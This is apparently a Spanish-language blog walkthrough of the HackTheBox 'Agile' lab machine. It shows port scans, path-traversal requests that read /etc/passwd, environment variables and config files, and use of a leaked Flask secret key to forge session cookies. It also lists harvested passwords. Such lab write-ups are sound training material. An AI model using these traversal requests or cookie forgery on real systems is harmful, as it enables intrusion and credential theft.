@@ -1,0 +1,630 @@
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link rel="preload" href="/nextjs-github-pages/_next/static/css/bff8db8335876f50.css" as="style" crossorigin=""/><link rel="stylesheet" href="/nextjs-github-pages/_next/static/css/bff8db8335876f50.css" crossorigin="" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" crossorigin="" nomodule="" src="/nextjs-github-pages/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/nextjs-github-pages/_next/static/chunks/webpack-a4f5812bb7f5b7f2.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/framework-5429a50ba5373c56.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/main-f79afddfaed1e50b.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/pages/_app-a4ac65f2b1f77632.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/855-affb66a2508f9c52.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/pages/posts/post/%5Bslug%5D-49000cd62d2003b4.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/8FBaA9tE3H2FwnNG4HFAa/_buildManifest.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/8FBaA9tE3H2FwnNG4HFAa/_ssgManifest.js" defer="" crossorigin=""></script></head><body class=" bg-gray-100"><div id="__next"><div class="flex flex-col h-screen"><div class="w-full  bg-black"><div class="max-w-screen-xl mx-auto"><header class="flex items-center justify-between py-5  "><a class="px-2 text-xl lg:px-0 font-bold text-orange-400" href="/nextjs-github-pages">Github Blog</a><ul class="inline-flex items-center"><li class="px-2 md:px-4"><a class="text-white font-semibold hover:text-orange-500" href="/nextjs-github-pages"> Home </a></li><li class="px-2 md:px-4"><a class="text-white font-semibold hover:text-orange-500" href="/nextjs-github-pages/dev"> Developerment </a></li><li class="px-2 md:px-4"><a class="text-white font-semibold hover:text-orange-500" href="/nextjs-github-pages/htb"> HackTheBox </a></li><li class="px-2 md:px-4"><a class="text-white font-semibold hover:text-orange-500" href="/nextjs-github-pages/pentesting-web"> Pentesting Web </a></li></ul></header></div></div><main class="flex-grow"><div class="container mx-auto px-4"><h1 class="text-6xl text-center py-20 font-bold">HackTheBox - Maquina Agile</h1><h5 class="text-xl text-center">Paso a paso de la explotación de la máquina Agile de HackTheBox.</h5><div><div><h6 class="text-center pt-3">Dificultad: <span class="text-orange-400">Medium</span></h6><h6 class="text-center ">OS <!-- -->Sistema Operativo Linux</h6></div></div><h6 class="text-center py-5">Publicado el <!-- -->9 de febrero de 2024</h6><h2 class="text-2xl py-10 text-center font-bold">Enumeración de puertos</h2>
+<h3 class="text-lg my-5 font-bold">TCP</h3>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Enumeracion de Puertos TCP</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">nmap -p- -A 10.129.30.106
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:14 EST
+Nmap scan report for 10.129.30.106
+Host is up (0.15s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
+|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://superpass.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 502.76 seconds
+</code></pre>
+<h3 class="text-lg my-5 font-bold">UDP</h3>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Enumeración de puertos UDP</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">sudo nmap -F -sU 10.129.30.106
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:32 EST
+Nmap scan report for agile.htb (10.129.30.106)
+Host is up (0.15s latency).
+Not shown: 99 closed udp ports (port-unreach)
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+Nmap done: 1 IP address (1 host up) scanned in 106.72 seconds
+</code></pre>
+<h2 class="text-2xl py-10 text-center font-bold">Enumeracion de Servicios</h2>
+<h3 class="text-lg my-5 font-bold">Puerto 80</h3>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Definimos el subdominio superpass.htb (este es visible en el título de la página de Nginx, tambien visible en los resultados de nmap)</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230306113515.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Intentamos registrarnos en la aplicacion web</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230306114025.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Al intentarlo obtenemos el siguiente error</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230306113616.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego de registrarnos ingresamos a la siguiente página</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Podemos ingresar algunas credenciales al baul.Intentamos exportarlas</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego intentamos extraer archivos interesantes de información, como el archivo (etc/passwd)</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">GET /download?fn=../../etc/passwd HTTP/1.1
+Host: superpass.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
+Connection: close
+</code></pre>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 06 Mar 2023 14:51:57 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 1744
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+corum:x:1000:1000:corum:/home/corum:/bin/bash
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+_laurel:x:999:999::/var/log/laurel:/bin/false
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Consultamos las variables de entorno del sistema</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">GET /download?fn=../../proc/self/environ HTTP/1.1
+Host: superpass.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
+Connection: close
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230306121100.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Buscamos el directorio /app/config_prod.json</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">GET /download?fn=../../home/dev_admin/app/config_prod.json HTTP/1.1
+Host: superpass.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
+Connection: close
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">No tenemos acceso al archivo pero encontramos un campo llamado secret en la respuesta</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">HTTP/1.1 500 INTERNAL SERVER ERROR
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 06 Mar 2023 15:15:35 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 13637
+Connection: close
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+  &lt;head&gt;
+    &lt;title&gt;PermissionError: [Errno 13] Permission denied: &#x27;/tmp/../../home/dev_admin/app/config_prod.json&#x27;
+ // Werkzeug Debugger&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;?__debugger__=yes&amp;amp;cmd=res&amp;amp;f=style.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot;
+        href=&quot;?__debugger__=yes&amp;amp;cmd=res&amp;amp;f=console.png&quot;&gt;
+    &lt;script src=&quot;?__debugger__=yes&amp;amp;cmd=res&amp;amp;f=debugger.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+      var CONSOLE_MODE = false,
+          EVALEX = true,
+          EVALEX_TRUSTED = false,
+          SECRET = &quot;0k71JQ5bp0qM5tHnQe0w&quot;;
+    &lt;/script&gt;
+  &lt;/head&gt;
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Datos del archivo hosts</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 06 Mar 2023 15:48:03 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 253
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+127.0.0.1 localhost superpass.htb test.superpass.htb
+127.0.1.1 agile
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Archivo /etc/mysql/my.cnf</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 06 Mar 2023 15:48:05 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 682
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+#
+# The MySQL database server configuration file.
+#
+# You can copy this to one of:
+# - &quot;/etc/mysql/my.cnf&quot; to set global options,
+# - &quot;~/.my.cnf&quot; to set user-specific options.
+# 
+# One can use all long options that the program supports.
+# Run program with --help to get a list of available options and with
+# --print-defaults to see which it would actually understand and use.
+#
+# For explanations see
+# http://dev.mysql.com/doc/mysql/en/server-system-variables.html
+
+#
+# * IMPORTANT: Additional settings that can override those from this file!
+#   The files must end with &#x27;.cnf&#x27;, otherwise they&#x27;ll be ignored.
+#
+
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Kernel versión</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 06 Mar 2023 15:48:08 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 184
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+Linux version 5.15.0-60-generic (buildd@lcy02-amd64-054) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Nginx error log</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 06 Mar 2023 15:48:51 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 82947
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+2023/02/28 16:21:17 [error] 1004#1004: *14 open() &quot;/app/app/superpass/static/webfonts/josefinsans.ttf&quot; failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: &quot;GET /static/webfonts/josefinsans.ttf HTTP/1.1&quot;, host: &quot;superpass.htb&quot;, referrer: &quot;http://superpass.htb/static/css/josefinsans.css&quot;
+2023/02/28 16:23:58 [error] 1004#1004: *18 open() &quot;/app/app/superpass/static/webfonts/josefinsans.ttf&quot; failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: &quot;GET /static/webfonts/josefinsans.ttf HTTP/1.1&quot;, host: &quot;superpass.htb&quot;, referrer: &quot;http://superpass.htb/static/css/josefinsans.css&quot;
+
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Consultamos el archivo  /app/config_prod.json</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">GET /download?fn=../../app/config_prod.json HTTP/1.1
+Host: superpass.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
+Connection: close
+</code></pre>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 06 Mar 2023 17:15:30 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 88
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+{&quot;SQL_URI&quot;: &quot;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&quot;}
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Código fuente de app.py</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">GET /download?fn=../../app/app/superpass/app.py HTTP/1.1
+Host: superpass.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
+Connection: close
+</code></pre>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">
+import json
+import os
+import sys
+import flask
+import jinja_partials
+from flask_login import LoginManager
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), &#x27;..&#x27;)))
+from superpass.infrastructure.view_modifiers import response
+from superpass.data import db_session
+
+app = flask.Flask(__name__)
+app.config[&#x27;SECRET_KEY&#x27;] = &#x27;MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD&#x27;
+
+
+def register_blueprints():
+    from superpass.views import home_views
+    from superpass.views import vault_views
+    from superpass.views import account_views
+    
+    app.register_blueprint(home_views.blueprint)
+    app.register_blueprint(vault_views.blueprint)
+    app.register_blueprint(account_views.blueprint)
+
+
+def setup_db():
+    db_session.global_init(app.config[&#x27;SQL_URI&#x27;])
+
+
+def configure_login_manager():
+    login_manager = LoginManager()
+    login_manager.login_view = &#x27;account.login_get&#x27;
+    login_manager.init_app(app)
+
+    from superpass.data.user import User
+
+    @login_manager.user_loader
+    def load_user(user_id):
+        from superpass.services.user_service import get_user_by_id
+        return get_user_by_id(user_id)
+
+
+def configure_template_options():
+    jinja_partials.register_extensions(app)
+    helpers = {
+        &#x27;len&#x27;: len,
+        &#x27;str&#x27;: str,
+        &#x27;type&#x27;: type,
+    }
+    app.jinja_env.globals.update(**helpers)
+
+
+def load_config():
+    config_path = os.getenv(&quot;CONFIG_PATH&quot;)
+    with open(config_path, &#x27;r&#x27;) as f:
+        for k, v in json.load(f).items():
+            app.config[k] = v
+
+
+def configure():
+    load_config()
+    register_blueprints()
+    configure_login_manager()
+    setup_db()
+    configure_template_options()
+
+
+def enable_debug():
+    from werkzeug.debug import DebuggedApplication
+    app.wsgi_app = DebuggedApplication(app.wsgi_app, True)
+    app.debug = True
+
+
+def main():
+    enable_debug()
+    configure()
+    app.run(debug=True)
+
+
+def dev():
+    configure()
+    app.run(port=5555)
+
+
+if __name__ == &#x27;__main__&#x27;:
+    main()
+else:
+    configure()
+
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Usamos el secret_key para extraer la información de la cookie del usuario</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Credenciales encontradas</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">flask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vEF5_-9daSA.ZAYqgQ.Zvh6p_nlvHTv1LtEwEhcdp-rjUo
+</code></pre>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">{&#x27;_flashes&#x27;: [(&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;), (&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;)], &#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90&#x27;, &#x27;_user_id&#x27;: &#x27;9&#x27;}
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Creamos nuestra propia session</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">{&#x27;_flashes&#x27;: [(&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;), (&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;)], &#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;}
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">El comando a usar es:</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">flask-unsign --sign --cookie &quot;{&#x27;_flashes&#x27;: [(&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;), (&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;)], &#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;}&quot; -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD 
+.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230306150725.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego lo intentamos con el  _user_id: 2</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230306150956.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Users:</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">corum
+runner
+edwards
+dev_admin
+superpassuser
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Passwords:</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD
+dSA6l7q*yIVs$39Ml6ywvgK
+0k71JQ5bp0qM5tHnQe0w
+</code></pre>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">0xdf:762b430d32eea2f12970
+0xdf:5b133f7a6a1c180646cb
+corum:47ed1e73c955de230a1d
+corum:9799588839ed0f98c211
+corum:5db7caa1d13cc37c9fc2
+</code></pre>
+<h2 class="text-2xl py-10 text-center font-bold">Getting a shell</h2>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Intentamos acceder a través de SSH con las credenciales del usuario Corum</p>
